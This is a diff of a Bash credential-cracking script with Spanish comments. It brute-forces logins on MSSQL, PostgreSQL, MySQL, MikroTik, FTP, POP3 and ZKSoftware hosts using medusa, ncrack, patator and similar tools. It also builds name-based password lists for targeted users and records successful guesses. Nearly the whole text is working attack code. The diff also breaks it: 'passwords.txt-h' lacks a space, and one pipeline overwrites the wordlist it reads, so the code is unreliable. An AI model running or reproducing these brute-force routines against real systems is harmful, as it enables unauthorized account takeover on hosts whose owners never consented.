+		echo -e "passWeb.pl -t $ip -p $port -m ZKSoftware -u administrator -f passwords.txt" > logs/cracking/"$ip"_80_passwordZKSoftware.txt
+		passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f passwords.txt>> logs/cracking/"$ip"_80_passwordZKSoftware.txt
 		grep --color=never 'encontrado' logs/cracking/"$ip"_80_passwordZKSoftware.txt | tee -a .vulnerabilidades/"$ip"_80_passwordZKSoftware.txt
 		echo ""			
 	done
@@ -537,14 +534,14 @@ then
 		port=`echo $line | cut -f2 -d":"`
 		
 		echo -e "[+] Probando $ip"						
-		echo "medusa -e n -u sa -P top.txt -h $ip -M mssql" >> logs/cracking/"$ip"_mssql_passwordBD.txt
-		medusa -e n -u sa -P top.txt -h $ip -M mssql >> logs/cracking/"$ip"_mssql_passwordBD.txt 2>/dev/null
+		echo "medusa -e n -u sa -P passwords.txt-h $ip -M mssql" >> logs/cracking/"$ip"_mssql_passwordBD.txt
+		medusa -e n -u sa -P passwords.txt-h $ip -M mssql >> logs/cracking/"$ip"_mssql_passwordBD.txt 2>/dev/null
 		
-		echo -e "\n medusa -e n -u adm -P top.txt -h $ip -M mssql" >>  logs/cracking/"$ip"_mssql_passwordBD.txt
-		medusa -e n -u adm -P top.txt -h $ip -M mssql >>  logs/cracking/"$ip"_mssql_passwordBD.txt 2>/dev/null
+		echo -e "\n medusa -e n -u adm -P passwords.txt-h $ip -M mssql" >>  logs/cracking/"$ip"_mssql_passwordBD.txt
+		medusa -e n -u adm -P passwords.txt-h $ip -M mssql >>  logs/cracking/"$ip"_mssql_passwordBD.txt 2>/dev/null
 		
-		#echo -e "\n medusa -e n -u $ENTIDAD -P top.txt -h $ip -M mssql" >>  logs/cracking/"$ip"_mongo_passwordBD.txt
-		#medusa -e n -u $ENTIDAD -P top.txt -h $ip -M mssql >>  logs/cracking/"$ip"_mongo_passwordBD.txt
+		#echo -e "\n medusa -e n -u $ENTIDAD -P passwords.txt-h $ip -M mssql" >>  logs/cracking/"$ip"_mongo_passwordBD.txt
+		#medusa -e n -u $ENTIDAD -P passwords.txt-h $ip -M mssql >>  logs/cracking/"$ip"_mongo_passwordBD.txt
 		
 		grep --color=never SUCCESS logs/cracking/"$ip"_mssql_passwordBD.txt > .vulnerabilidades/"$ip"_mssql_passwordBD.txt
 		
@@ -603,20 +600,20 @@ if [ -f servicios/postgres.txt ]
 then
 
 	echo -e "$OKBLUE\n\t#################### postgres ######################$RESET"	    
-	 sed -i '1 i\postgres' top.txt	#adicionar password postgres
+	 sed -i '1 i\postgres' passwords.txt	#adicionar password postgres
 	 for line in $(cat servicios/postgres.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`			
 		
 		echo -e "[+] Probando $ip"
-		echo "medusa -e n -u postgres -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
-		medusa -e n -u postgres -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null
+		echo "medusa -e n -u postgres -P passwords.txt-h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		medusa -e n -u postgres -P passwords.txt-h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null
 		
-		echo -e "\n medusa -e n -u pgsql -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
-		medusa -e n -u pgsql -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null
+		echo -e "\n medusa -e n -u pgsql -P passwords.txt-h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		medusa -e n -u pgsql -P passwords.txt-h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null
 		
-		#echo -e "\nmedusa -e n -u $ENTIDAD -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
-		#medusa -e n -u $ENTIDAD -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		#echo -e "\nmedusa -e n -u $ENTIDAD -P passwords.txt-h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		#medusa -e n -u $ENTIDAD -P passwords.txt-h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
 		
 		grep --color=never SUCCESS logs/cracking/"$ip"_5432_passwordBD.txt > .vulnerabilidades/"$ip"_5432_passwordBD.txt
 		
@@ -632,12 +629,12 @@ then
 	for ip in $(cat servicios/MikroTik.txt); do		
 		echo -e "[+] Probando $ip"
 				
-		echo "mkbrutus.py -t $ip -u admin --dictionary top.txt" >>  logs/cracking/"$ip"_8728_passwordMikroTik.txt		
-		mkbrutus.py -t $ip -u admin --dictionary top.txt >>  logs/cracking/"$ip"_8728_passwordMikroTik.txt
+		echo "mkbrutus.py -t $ip -u admin --dictionary passwords.txt" >>  logs/cracking/"$ip"_8728_passwordMikroTik.txt		
+		mkbrutus.py -t $ip -u admin --dictionary passwords.txt>>  logs/cracking/"$ip"_8728_passwordMikroTik.txt
 		
 		echo "" >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
-		echo "mkbrutus.py -t $ip -u $ENTIDAD --dictionary top.txt" >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
-		mkbrutus.py -t $ip -u $ENTIDAD --dictionary top.txt >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
+		echo "mkbrutus.py -t $ip -u $ENTIDAD --dictionary passwords.txt" >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
+		mkbrutus.py -t $ip -u $ENTIDAD --dictionary passwords.txt>> logs/cracking/"$ip"_8728_passwordMikroTik.txt
 
 		grep --color=never successful logs/cracking/"$ip"_8728_passwordMikroTik.txt | grep -v "unsuccessful" > .vulnerabilidades/"$ip"_8728_passwordMikroTik.txt
 		
@@ -651,7 +648,7 @@ if [ -f servicios/mysql.txt ]
 then
        	
 	echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL (lennnto) ######################$RESET"	
-	sed -i '1 i\mysql' top.txt	#adicionar password mysql
+	sed -i '1 i\mysql' passwords.txt	#adicionar password mysql
 	for line in $(cat servicios/mysql.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
@@ -662,20 +659,20 @@ then
 			echo "El servicio no esta funcionando correctamente"
 							
 		else
-			echo -e "\n medusa -e n -u root -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt 
-			medusa -e n -u root -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
+			echo -e "\n medusa -e n -u root -P passwords.txt-h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt 
+			medusa -e n -u root -P passwords.txt-h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
 			
-			echo -e "\n medusa -e n -u mysql -P top.txt -h $ip -M mysql" >> logs/cracking/"$ip"_3306_passwordBD.txt
-			medusa -e n -u mysql -P top.txt -h $ip -M mysql >> logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
+			echo -e "\n medusa -e n -u mysql -P passwords.txt-h $ip -M mysql" >> logs/cracking/"$ip"_3306_passwordBD.txt
+			medusa -e n -u mysql -P passwords.txt-h $ip -M mysql >> logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
 			
-			echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt
-			medusa -e n -u admin -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
+			echo -e "\n medusa -e n -u admin -P passwords.txt-h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt
+			medusa -e n -u admin -P passwords.txt-h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
 			
-			echo -e "\n medusa -e n -u $admin_user -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
-			medusa -e n -u $admin_user -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null			
+			echo -e "\n medusa -e n -u $admin_user -P passwords.txt-h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
+			medusa -e n -u $admin_user -P passwords.txt-h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null			
 			
-			#echo -e "\n medusa -e n -u $ENTIDAD  -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
-			#medusa -e n -u $ENTIDAD  -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt				
+			#echo -e "\n medusa -e n -u $ENTIDAD  -P passwords.txt-h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
+			#medusa -e n -u $ENTIDAD  -P passwords.txt-h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt				
 			
 			grep --color=never -i SUCCESS logs/cracking/"$ip"_3306_passwordBD.txt | tee -a .vulnerabilidades/"$ip"_3306_passwordBD.txt
 			echo ""		
@@ -702,8 +699,8 @@ fi
 		#ip=`echo $line | cut -f1 -d":"`
 		#port=`echo $line | cut -f2 -d":"`
 		#echo -e "[+] Probando $ip"
-#		medusa -e n -u root -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt	
-		#medusa -e n -u $entidad  -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt
+#		medusa -e n -u root -P passwords.txt-h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt	
+		#medusa -e n -u $entidad  -P passwords.txt-h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt
 		#grep --color=never SUCCESS logs/cracking/"$ip"_vmware.txt > .vulnerabilidades/"$ip"_vmware_passwordAdivinadoServ.txt
 #		echo ""			
 	 #done
@@ -819,14 +816,14 @@ then
 	if [[ $noImpresora_port21 -eq 1 && $noImpresora_port80 -eq 1 && $noImpresora_port23 -eq 1 ]] ; then			
 		echo -e "[+] Probando $ip"		
 		
-		#echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
-		#medusa -e n -u admin -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
+		#echo -e "\n medusa -e n -u admin -P passwords.txt-h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
+		#medusa -e n -u admin -P passwords.txt-h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
 		
-		echo -e "\n medusa  -u root -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
-		medusa  -u root -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
+		echo -e "\n medusa  -u root -P passwords.txt-h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
+		medusa  -u root -P passwords.txt-h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
 		
-		echo -e "\n medusa  -u ftp -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
-		medusa -u ftp -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
+		echo -e "\n medusa  -u ftp -P passwords.txt-h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
+		medusa -u ftp -P passwords.txt-h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
 		
 		respuesta=`grep --color=never SUCCESS logs/cracking/"$ip"_21_passwordAdivinadoServ.txt`
 		greprc=$?
@@ -894,7 +891,7 @@ then
 			generate_password.pl "$fullname" > passwords2.txt # password en base a su usuario
 			head -1 passwords2.txt > base.txt # solo primer nombre
 			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
-			cat passwords2.txt passwords3.txt top.txt| sort | uniq > passwords.txt			
+			cat passwords2.txt passwords3.txt passwords.txt| sort | uniq > passwords.txt			
 			username=`tail -1 passwords2.txt` # dtorres
 			echo -e "\n\t[+] username $username"			
 			patator.py pop_login host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop-$username.txt 2>> logs/cracking/"$ip"_pop-$username.txt		
@@ -931,7 +928,7 @@ then
 			generate_password.pl "$fullname" > passwords2.txt # password en base a su usuario
 			head -1 passwords2.txt > base.txt # solo primer nombre
 			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
-			cat passwords2.txt passwords3.txt top.txt| sort | uniq > passwords.txt			
+			cat passwords2.txt passwords3.txt passwords.txt| sort | uniq > passwords.txt			
 			username=`tail -1 passwords2.txt` # dtorres
 			echo -e "\n\t[+] username $username"			
 			patator.py pop_passd host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop3pw-$username.txt 2>> logs/cracking/"$ip"_pop3pw-$username.txt		
@@ -958,7 +955,7 @@ then
 		ncrack_instances=`pgrep ncrack | wc -l`
 		if [ "$ncrack_instances" -lt $max_ins ] #Max 10 instances
 		then
-			ncrack --user "$admin_user" -P top.txt -p $port -g cd=8 $ip | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
+			ncrack --user "$admin_user" -P passwords.txt-p $port -g cd=8 $ip | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
 			echo ""		
 		else
 			echo "Max instancias de ncrack ($max_ins)"
